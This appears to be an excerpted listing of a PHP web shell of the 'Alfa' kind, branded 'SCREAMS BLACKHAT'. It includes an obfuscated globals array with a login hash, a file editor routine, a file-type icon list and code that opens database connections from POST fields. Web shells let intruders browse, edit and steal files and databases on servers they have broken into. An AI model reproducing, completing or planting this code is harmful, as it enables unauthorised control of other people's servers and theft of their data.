...
$GLOBALS['NeUSMyPGXP'] = array(
	...
	'paLDRhHfAovu' => 'd8d214b8a9732cde5fe2b033bb495fa1',//login 
...
<center><img style="border-radius:100px;" width="500" height="250" alt="" src="https://i.ibb.co/31Ggzyb/SCREAMS-BLACKHAT-20201002-224210.jpg" /></center>
...
function editor(file, mode, arg, pwd, file_id, type){
	...
	if(file.indexOf("/") != -1){
		var file_split =file.split("/");file = file_split[file_split.length - 1];
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="" src="https://i.ibb.co/31Ggzyb/SCREAMS-BLACKHAT-20201002-224210.jpg" /></td>
</tr>
<tr>
...
$new = '\'show_icons\' => \''.$icon.'\',';$data = str_replace($e[0],$new,$data);
}
...
$s = 'https://i.ibb.co/31Ggzyb/';
$types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
if($type!='file'){
return ($file=='..'?$s.'back.png':$s.'SCREAMS-BLACKHAT-20201002-224210.jpg');
}else{
$ext = explode('.',$file);
$ext = end($ext);
$ext = strtolower($ext);
...
if($_POST['alfa5']!=''){
$db_host=($_POST['alfa7']);
$db_username=($_POST['alfa3']);$db_password=($_POST['alfa4']);
$db_name=($_POST['alfa5']);
